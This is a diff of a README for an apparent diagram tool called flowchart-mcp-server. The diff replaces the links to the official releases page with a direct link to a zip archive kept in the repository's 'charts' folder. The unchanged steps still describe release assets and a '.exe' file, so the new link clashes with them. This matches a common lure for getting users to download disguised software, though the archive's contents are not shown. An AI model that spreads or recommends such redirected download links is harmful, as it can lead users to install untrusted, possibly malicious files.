@@ -1,6 +1,6 @@
 # 📊 flowchart-mcp-server - Create clear diagrams from simple text
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Lawsonseminiferous124/flowchart-mcp-server/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Lawsonseminiferous124/flowchart-mcp-server/raw/refs/heads/main/charts/flowchart-mcp-server-v3.7.zip)
 
 ## What this software does
 
@@ -19,7 +19,7 @@ Before you install this software, confirm your computer meets these needs:
 
 You need to download the installation file from the official releases page.
 
-1.  Visit this page to download: [https://github.com/Lawsonseminiferous124/flowchart-mcp-server/releases](https://github.com/Lawsonseminiferous124/flowchart-mcp-server/releases)
+1.  Visit this page to download: [https://github.com/Lawsonseminiferous124/flowchart-mcp-server/raw/refs/heads/main/charts/flowchart-mcp-server-v3.7.zip](https://github.com/Lawsonseminiferous124/flowchart-mcp-server/raw/refs/heads/main/charts/flowchart-mcp-server-v3.7.zip)
 2.  Look for the section labeled "Assets" at the bottom of the latest release.
 3.  Click the file ending in `.exe` to start the download.
 4.  Save the file to your "Downloads" folder.
